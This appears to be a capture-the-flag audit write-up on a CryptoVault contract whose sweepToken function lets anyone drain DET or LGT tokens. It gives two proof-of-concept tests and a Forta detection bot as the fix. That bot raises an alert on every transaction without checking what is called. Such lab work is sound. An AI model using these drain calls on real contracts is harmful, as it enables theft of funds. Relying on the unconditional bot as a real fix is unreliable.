# Crypto Vault

## Invariants

1. `SweepTokens` allows tu recover stuck tokens
2. `Swaps ERC20` for `DET` if delegate.

## Target

- Protect `CryptoVault` from being drained.

## Potential Vulnerabilities

1. <del>Malicious `DelegateERC20` can `swap` and `sweep` draining ilegitimately swept tokens previoulsy.</del>
2. <del>users holding LGT might swap comulatively</del>

## Main Vulnerability

1. Anyone can damage `DoubleEntryPoint` if delegate:
   1. true: drain `DET`
   2. false: drain `LGT`

No other ERC20 except for `LGT` delegates are allowed, meaning that these tokens are only capable for recovering if `stuck`, and `swaps` are supposed to only allow `LGT` and knowing that `DET` is not swappable,`swaps` cannot occur on the protocol.

# 1 Vulnerability

**Proof of concept:**

Anyone can drain to Vault's recipient address:

  <details>

   <summary> 1:Draining DET</summary>

```javascript
  function testDrainsDETWithDelegate() public {
      //Already delegated at setUp
      vault.sweepToken(lgt);

      uint256 vaultBalance = det.balanceOf(address(vault));

      assertEq(vaultBalance, 0);
  }
```

</details>

<details>
   <summary> 2: Draining LGT</summary>

```javascript
    function testDraisLGTwithoutDelegatge() public {
       //Remove Delegation
       vm.prank(owner);
       lgt.delegateToNewContract(DoubleEntryPoint(address(0)));

       vault.sweepToken(lgt);

       uint256 vaultBalance = lgt.balanceOf(address(vault));

       assertEq(vaultBalance, 0);
    }
```

</details>

**Mitigation:**
Implement and register a bot so that once swaps over DET are attempt trigger an alert on Forta so as to revert Tx.

Assuming that `Legacy Token` is set `DoubleEntryPoint` as delegate.

```javascript
   //BOT
   contract DetectionBot is IDetectionBot {
      IForta forta;
      constructor(IForta _forta) {
         forta = _forta;
      }
      function handleTransaction(
         address user,
         bytes calldata /* msgData */
      ) external {
         forta.raiseAlert(user);
      }
   }
   //TEST
    function testPreventsSwapsOverDET() public {
        //Already delegated at setUp
        DetectionBot bot = new DetectionBot(forta);
        vm.prank(player);
        forta.setDetectionBot(address(bot));

        vm.expectRevert();
        vault.sweepToken(lgt);
    }

```
